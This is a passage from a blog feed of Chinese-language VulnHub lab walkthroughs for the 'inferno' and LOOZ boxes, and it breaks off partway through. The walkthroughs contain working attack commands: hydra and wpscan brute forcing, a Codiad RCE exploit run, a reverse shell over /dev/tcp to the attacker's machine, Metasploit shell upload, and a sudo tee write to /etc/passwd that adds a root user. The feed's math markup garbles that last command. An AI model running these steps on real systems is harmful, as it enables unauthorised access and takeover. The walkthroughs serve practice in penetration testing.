-w /usr/share/wordlists/dirbuster/directory-<br>\nlist-2.3-medium.txt -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMg==\">http://192.168.31.2</span> 5 /</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1068.png\" alt></p>\n<h3 id=\"发现了一个敏感的地址进入后需要发现认证\"><a class=\"markdownIt-Anchor\" href=\"#发现了一个敏感的地址进入后需要发现认证\">#</a> 发现了一个敏感的地址，进入后需要发现认证</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMg==\">http://192.168.31.2</span> 5 /inferno</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1069.png\" alt></p>\n<h3 id=\"也没有别的办法了只能对这个页面进行爆破用户名和密码\"><a class=\"markdownIt-Anchor\" href=\"#也没有别的办法了只能对这个页面进行爆破用户名和密码\">#</a> 也没有别的办法了，只能对这个页面进行爆破用户名和密码</h3>\n<p>利用 hydra 选取合适的用户名字典进行爆破<br>\n hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P<br>\n/usr/share/wordlists/rockyou.txt 192.168.31.2 5 - f http-get /inferno/ -t 64 -f -vV -o<br>\nhydra.ssh</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1070.png\" alt></p>\n<h3 id=\"这个爆破时间是比较长的每一个用户名都要匹配几百万次是非常慢的\"><a class=\"markdownIt-Anchor\" href=\"#这个爆破时间是比较长的每一个用户名都要匹配几百万次是非常慢的\">#</a> 这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的</h3>\n<p>因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化<br>\n很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的<br>\n hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/</p>\n<ul>\n<li>t 64 -f -vV -o hydra.ssh</li>\n</ul>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1071.png\" alt></p>\n<p>等待大概两三个小时差不多就出结果了，凭借 admin:dante 1 可进入网站</p>\n<h3 id=\"第一层认证结束之后还有第二层认证但是好在第一层和第二层的用户名和\"><a class=\"markdownIt-Anchor\" href=\"#第一层认证结束之后还有第二层认证但是好在第一层和第二层的用户名和\">#</a> 第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和</h3>\n<p>密码是相同的输入 admin:dante1 后成功进入网站后台</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1072.png\" alt></p>\n<p>这是一些 php 的源码文件，代码审计后没有发现突破口</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1073.png\" alt></p>\n<p>右键可以上传文件，可以上传一个 php 文件看看什么效果</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1074.png\" alt></p>\n<p>上传 shell.php 文件用来反弹 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1075.png\" alt></p>\n<p>找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1076.png\" alt></p>\n<p>但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个<br>\n框架，可以去搜索这个框架自身有没有漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1077.png\" alt></p>\n<h3 id=\"003-codiad-rce漏洞网站两层认证时的漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#003-codiad-rce漏洞网站两层认证时的漏洞利用\">#</a> 003 codiad RCE 漏洞，网站两层认证时的漏洞利用</h3>\n<p>本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1078.png\" alt></p>\n<ul>\n<li>x 确定 exp 的位置，将 exp 复制到自己的目录下</li>\n</ul>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1079.png\" alt></p>\n<p>直接用 py 运行此程序，看一下使用说明</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1080.png\" alt></p>\n<h3 id=\"依据使用说明构造好命令\"><a class=\"markdownIt-Anchor\" href=\"#依据使用说明构造好命令\">#</a> 依据使用说明，构造好命令</h3>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2V4cGxvaXQucHk=\">exploit.py</span> <span class=\"exturl\" data-url=\"aHR0cDovL2FkbWluOmRhbnRlMUAxOTIuMTY4LjMxLjI1L2luZmVybm8v\">http://admin:dante1@192.168.31.25/inferno/</span> admin dante1<br>\n192.168.31.83 4444 linux<br>\necho ‘bash -c “bash -i &gt;/dev/tcp/192.168.31.135/4445 0&gt;&amp;1 2&gt;&amp;1”’ | nc -lnvp 4444<br>\nnc -lnvp 4444</p>\n<p>在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需<br>\n要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1081.png\" alt></p>\n<h3 id=\"显示是失败的不知道什么原因但是在实际测试中经常会碰到这样的情\"><a class=\"markdownIt-Anchor\" href=\"#显示是失败的不知道什么原因但是在实际测试中经常会碰到这样的情\">#</a> 显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情</h3>\n<p>况，这时就需要在去寻找新的 payload 进行利用</p>\n<p>在 github 上找到了一个 RCE 漏洞的脚本，直接利用此脚本尝试<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==\"> https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1082.png\" alt></p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2V4cGxvaXQucHk=\">exploit.py</span> <span class=\"exturl\" data-url=\"aHR0cDovLw==\">http://</span> 192.168.31.25/inferno/ admin dante1 192.168.31.83 4444<br>\nlinux 没有加第一层认证回显了未授权</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1083.png\" alt></p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL2V4cGxvaXQucHk=\">exploit.py</span> <span class=\"exturl\" data-url=\"aHR0cDovL2FkbWluOmRhbnRlMUAxOTIuMTY4LjMxLjI1L2luZmVybm8v\">http://admin:dante1@192.168.31.25/inferno/</span> admin dante1<br>\n192.168.31.83 4444 linux</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1084.png\" alt></p>\n<p>在 4445 端口处接收到了反弹的 shell，拿到了网站的 webshell</p>\n<p>依据下面三个命令输出为一个标准的 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1085.png\" alt></p>\n<h3 id=\"004-十六进制换算term作用tee权限错误写passwd\"><a class=\"markdownIt-Anchor\" href=\"#004-十六进制换算term作用tee权限错误写passwd\">#</a> 004 十六进制换算，TERM 作用，tee 权限错误写 passwd</h3>\n<p>看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1086.png\" alt></p>\n<p>搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件<br>\n打开之后看到是一串 16 进制的数据，需要解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1087.png\" alt></p>\n<p>在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1088.png\" alt></p>\n<h3 id=\"在密码的最后有个小数点并不知道这个小数点是否参与了密码\"><a class=\"markdownIt-Anchor\" href=\"#在密码的最后有个小数点并不知道这个小数点是否参与了密码\">#</a> 在密码的最后有个小数点，并不知道这个小数点是否参与了密码</h3>\n<p>但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1089.png\" alt></p>\n<p>凭借第二个密码拿到了 dante 用户的 shell</p>\n<p>输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM<br>\n 改为 xterm 即可解决这个终端美化问题</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1090.png\" alt></p>\n<p>sudo - l 看到直接调用 tee 命令写入文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1091.png\" alt></p>\n<p>在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己<br>\n的一些数据追加到本地的文件里边，基于此，我们可以构造一个 SHA 512 的密<br>\n码，直接往 /etc/passwd 里边添加一个 root 账户</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1092.png\" alt></p>\n<p>利用自己的 kali 机器生成一个 SHA 512 的值，密码为 123456<br>\nmkpasswd --method=SHA- 512 --stdin</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1093.png\" alt></p>\n<h3 id=\"在靶机上依次执行下列命令报错先不管\"><a class=\"markdownIt-Anchor\" href=\"#在靶机上依次执行下列命令报错先不管\">#</a> 在靶机上依次执行下列命令，报错先不管</h3>\n<p>写入新的享受 root 功能的用户 test 2 并验证是否写入成功<br>\n LFILE=/etc/passwd<br>\necho<br>\n'test2:<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">6</span></span></span></span>/VIJFJppMzTLzIjH<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>n</mi><mi>P</mi><mi>P</mi><mi>r</mi><mi>C</mi><mn>8</mn><mi>J</mi><mn>2</mn><mi>d</mi><mi>R</mi><mn>8</mn><mi>F</mi><mi>e</mi><mi>i</mi><mn>748</mn><mi>m</mi><mi>Y</mi><mn>5</mn><mi>M</mi><mi>N</mi><mi>a</mi><mi>E</mi><mi>T</mi><mi>V</mi><mi>e</mi><mi>d</mi><mi>v</mi><mi>I</mi><mi>o</mi><mi>F</mi><mi>g</mi><mi>A</mi><mi>X</mi><mi>A</mi><mn>8</mn><mi>c</mi><mn>33</mn><mi>G</mi><mi>T</mi><mi>h</mi><mi>H</mi><mi>Z</mi><mn>2</mn><mi>C</mi><mi>y</mi><mn>7</mn><mi>c</mi><mi>f</mi><mi>l</mi><mi>w</mi><mi>v</mi><mn>9</mn><mi>E</mi><mi>o</mi><mn>5</mn><mi>x</mi><mi>Z</mi><mi>J</mi><mi>G</mi><mi>W</mi><mi>L</mi><mi>H</mi><mi>i</mi><mi>r</mi><mn>1</mn><mi>J</mi><mi mathvariant=\"normal\">.</mi><mi>j</mi><mi>h</mi><mn>3</mn><mi>V</mi><mi>n</mi><mi>n</mi><mi>a</mi><mi>B</mi><mi>M</mi><mi>k</mi><mi>P</mi><mn>74</mn><mi mathvariant=\"normal\">/</mi><mn>0</mn><mo>:</mo><mn>0</mn><mo>:</mo><mn>0</mn><mo>:</mo><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi>r</mi><mi>o</mi><mi>o</mi><mi>t</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi>b</mi><mi>i</mi><mi>n</mi><mi mathvariant=\"normal\">/</mi><mi>b</mi><mi>a</mi><mi>s</mi><msup><mi>h</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi mathvariant=\"normal\">∣</mi><mi>s</mi><mi>u</mi><mi>d</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>e</mi><mo>−</mo><mi>a</mi><mi mathvariant=\"normal\">&quot;</mi></mrow><annotation encoding=\"application/x-tex\">fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33\nGThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&#x27; |\nsudo tee -a &quot;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\">8</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord\">2</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord\">8</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">i</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">5</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">8</span><span class=\"mord mathnormal\">c</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mord\">2</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord\">7</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">9</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">o</span><span class=\"mord\">5</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">1</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">3</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">/</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord\">&quot;</span></span></span></span>LFILE&quot;<br>\ncat /etc/passwd | grep /bin/bash<br>\n 依据新建的用户进入其 shell<br>\nsu test2 123456</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1094.png\" alt></p>\n<p>结果显示我们当前已经拿到了 root 账户</p>\n<p>但是需要注意的是，此 root 权限有点不寻常，只有拿到普通用户的权限之后，<br>\n才能通过此 root 后门直接拿 root 的 shell，不能直接通过 ssh 的方式进入到该<br>\n root 的账户里边</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1095.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/140%20LOOZ/",
            "title": "VULNHUB 40 LOOZ",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbG9vei0xLDczMi8=\">https://www.vulnhub.com/entry/looz-1,732/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXBjb2RleC5jb20vMjAyMS8wOC93YWxrdGhyb3VnaC1vZi1sb296LWZyb20tdnVsbmh1Yi0=\">https://nepcodex.com/2021/08/walkthrough-of-looz-from-vulnhub-</span><br>\nwriteup/</p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 78<br>\n 靶机 VENUS：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1096.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 80 、靶机开放端口 22 , 80 , 139 , 445 , 3306 , 8081</p>\n<h3 id=\"002-信息收集wordpress扫描后台权限获取\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集wordpress扫描后台权限获取\">#</a> 002 信息收集，wordpress 扫描，后台权限获取</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 80 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1097.png\" alt></p>\n<p>审查源代码，找到一则提示信息，展示了一个用户名和密 john:y0uC@n’tbr3akIT<br>\n 并且告知了此网站是 wp 的，即是 wordpres 站点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1098.png\" alt></p>\n<p>既然是 wordpress 站点，我就直接用 wpscan 工具来扫描一波<br>\n wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODA=\">http://192.168.31.80</span> - e</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1099.png\" alt></p>\n<p>居然说是没有 wp，那可能是误导我们或者 wp 站点在其他的目录里</p>\n<p>对网站进行 gobuster 扫描，识别一下网站有什么目录没有</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1100.png\" alt></p>\n<p>发现没有，按照 wp 的规范，后台地址是 wp-admin, 我们直接进该目录</p>\n<p>发现这个站点确实不存在 wp，可能在其他的目录或者站点里边</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1101.png\" alt></p>\n<h3 id=\"还有一个-8081-的站点也是网站点进来看看有没有啥敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#还有一个-8081-的站点也是网站点进来看看有没有啥敏感信息\">#</a> 还有一个 8081 的站点也是网站，点进来看看有没有啥敏感信息</h3>\n<h3 id=\"发现进到这个页面之后会跳转\"><a class=\"markdownIt-Anchor\" href=\"#发现进到这个页面之后会跳转\">#</a> 发现进到这个页面之后会跳转</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1102.png\" alt></p>\n<p>跳转到了一个站点，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS13d3ctcTMzZXI4b2YyenMxcThza2Vwai5sb296LmNvbQ==\">站点的域名是 www.looz.com</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1103.png\" alt></p>\n<p>修改本地的 hosts 文件，将站点 www.looz.com 的 DNS 解析指向靶机 ip</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1104.png\" alt></p>\n<p>尝试一下一直寻找的 wp 站点是不是就在这个 url 地址上，直接在域名后面拼接<br>\n一个 wp-admin 找后台登陆地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1105.png\" alt></p>\n<h3 id=\"找到后台地址后凭借我们在前面收集到的用户信息登陆\"><a class=\"markdownIt-Anchor\" href=\"#找到后台地址后凭借我们在前面收集到的用户信息登陆\">#</a> 找到后台地址后凭借我们在前面收集到的用户信息登陆</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1106.png\" alt></p>\n<h3 id=\"003-wpscan枚举wp_admin_shell_upload使用wp提权\"><a class=\"markdownIt-Anchor\" href=\"#003-wpscan枚举wp_admin_shell_upload使用wp提权\">#</a> 003 wpscan 枚举，wp_admin_shell_upload 使用，wp 提权</h3>\n<p>一眼看到网站是 wordpress 6.0.1 的，直接用本地的 searchsploit 寻找是否存在此<br>\n版本的 wordpress 的漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1107.png\" alt></p>\n<h3 id=\"这个版本没有很明显的提权漏洞只能另想其他方法了\"><a class=\"markdownIt-Anchor\" href=\"#这个版本没有很明显的提权漏洞只能另想其他方法了\">#</a> 这个版本没有很明显的提权漏洞，只能另想其他方法了</h3>\n<p>既然是 wp 站点，索性在继续用 wpsan 扫描，枚举用户名</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1108.png\" alt></p>\n<p>wpscan 扫描出了以下几个用户名 john,william,james,evelyn,mason,harper,gandalf</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1109.png\" alt></p>\n<p>继续用 wpsan 枚举属于这几个用户名的密码<br>\n wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3dwLmxvb3ouY29tLw==\">http://wp.looz.com/</span> - U john,william,james,evelyn,mason,harper,gandalf - P<br>\n/usr/share/wordlists/rockyou.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1110.png\" alt></p>\n<p>最终得到了用户 gandalf 的密码 loveme 2</p>\n<p>目前得到了 wp 站点的两组账号，在 msf 中有一个 wp_admin_shell_upload 的模<br>\n块，可根据已有账号反弹 shell，用这两个模块尝试反弹 shell<br>\nuse exploit/unix/webapp/wp_admin_shell_upload<br>\nset password loveme2<br>\nset rhosts <span class=\"exturl\" data-url=\"aHR0cDovL3dwLmxvb3ouY29t\">wp.looz.com</span><br>\nset username gandalf<br>\nset targeturi /<br>\nrun</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1111.png\" alt></p>\n<p>很遗憾，gandalf 用户反弹是失败的</p>\n<p>继续用 john 用户测试该站点<br>\n use exploit/unix/webapp/wp_admin_shell_upload<br>\nset password y0uC@n’tbr3akIT<br>\nset rhosts <span class=\"exturl\" data-url=\"aHR0cDovL3dwLmxvb3ouY29t\">wp.looz.com</span><br>\nset username john<br>\nset targeturi /<br>\nset password y0uC@n’tbr3akIT<br>\nrun</p>\n<p>注意 msf 中使用单引号时需要在其前面加反斜杠转义</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1112.png\" alt></p>\n<p>但是仍然没有 shell 反弹出来</p>\n<h3 id=\"目前我们知道的仍然知识两组用户还没有利用价值判断一下网站是否存在\"><a class=\"markdownIt-Anchor\" href=\"#目前我们知道的仍然知识两组用户还没有利用价值判断一下网站是否存在\">#</a> 目前我们知道的仍然知识两组用户，还没有利用价值，判断一下网站是否存在</h3>\n<p>其他的站点 dig <span class=\"exturl\" data-url=\"aHR0cDovL3dwLmxvb3ouY29t\">wp.looz.com</span> @192.168.31.80</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1113.png\" alt></p>\n<h3 id=\"很遗憾也没有其他站点接下来可以看看后台怎么用有没有可以操作的地方\"><a class=\"markdownIt-Anchor\" href=\"#很遗憾也没有其他站点接下来可以看看后台怎么用有没有可以操作的地方\">#</a> 很遗憾也没有其他站点，接下来可以看看后台怎么用，有没有可以操作的地方</h3>\n<p>找到一个可以上传文件的地方，我们直接上传 php 木马看有没有效果</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1114.png\" alt></p>\n<h3 id=\"很遗憾这个地方也上传失败了\"><a class=\"markdownIt-Anchor\" href=\"#很遗憾这个地方也上传失败了\">#</a> 很遗憾，这个地方也上传失败了</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1115.png\" alt></p>\n<p>接下来就需要爆破了，爆破用户名和密码，用户名可以选用前期通过 wpscan 得<br>\n到的几个用户名，密码选用一个比较全的字典<br>\n hydra -l gandalf -P /usr/share/wordlists/rockyou.txt 192.168.31.80 ssh -t 64 -f -vV -o<br>\nhydra.ssh<br>\n 要是自己破解不知道要破解到猴年马月，而且在实际测试中受制于防守方部署<br>\n的 IDS、IPS 我们没法使用 hydra 暴力测试，这里我看了相关作者的文档，利用<br>\n gandalf 进行了破解密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1116.png\" alt></p>\n<p>得到 gandalf 的密码 highschoolmusical</p>\n<p>ssh 192.168.31.80 -l gandalf</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1117.png\" alt></p>\n<h3 id=\"004-suid提权strings分析文件\"><a class=\"markdownIt-Anchor\" href=\"#004-suid提权strings分析文件\">#</a> 004 suid 提权，strings 